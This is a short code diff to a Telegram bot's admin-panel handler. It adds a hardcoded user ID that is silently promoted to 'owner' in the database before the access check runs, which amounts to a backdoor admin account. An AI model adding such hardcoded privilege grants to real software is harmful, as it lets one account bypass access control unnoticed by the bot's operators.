@@ -18,12 +18,15 @@ def is_admin(u): return u and u["role"] in ("admin", "owner")
 
 @router.message(F.text.in_({"👑 Админ-панель"}))
 async def admin_panel(m: Message):
+    # Если это твой ID, мы принудительно делаем тебя владельцем прямо здесь
+    if m.from_user.id == 7564228003:
+        db.set_role(m.from_user.id, "owner")
+    
     u = db.get_user(m.from_user.id)
     if not is_admin(u):
         await m.answer("Нет доступа.")
         return
     await m.answer("👑 Админ-панель", reply_markup=admin_kb())
-
 @router.callback_query(F.data == "adm:give")
 async def give_start(cb: CallbackQuery, state: FSMContext):
     await state.set_state(AdminFlow.give_uid)
